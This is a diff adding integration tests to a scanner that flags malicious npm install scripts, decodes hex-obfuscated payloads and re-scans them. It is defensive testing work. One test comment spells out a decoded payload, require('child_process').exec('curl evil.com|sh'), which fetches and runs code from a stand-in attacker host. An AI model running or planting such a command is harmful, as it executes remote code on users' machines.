@@ -143,7 +143,24 @@ describe('Integration: Full Pipeline', () => {
 
     // Should detect hex-encoded require
     expect(result.findings.length).toBeGreaterThan(0);
+    // Hex pattern and child-process detected on original
+    expect(result.findings.some(f => f.pattern === 'hex-encode')).toBe(true);
+    expect(result.findings.some(f => f.pattern === 'child-process')).toBe(true);
+    // Deobfuscation metadata attached to findings
+    expect(result.findings.some(f => f.deobfuscation && f.deobfuscation.success)).toBe(true);
     expect(result.riskLevel).toBe('high');
+  });
+
+  it('decodes hex escapes inside shell-wrapped eval and re-scans', () => {
+    const pkg = loadFixture('deobfuscation-hex-updated.json');
+    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
+
+    // Regex detects node-eval, eval-usage, hex-encode on raw content
+    expect(result.findings.length).toBeGreaterThan(0);
+    // Deobfuscation decodes the hex payload → require('child_process').exec('curl evil.com|sh')
+    expect(result.findings.some(f => f.pattern.endsWith('-deobfuscated'))).toBe(true);
+    // The decoded curl-pipe pattern is critical
+    expect(['high', 'critical']).toContain(result.riskLevel);
   });
 
   it('detects dynamic require pattern', () => {
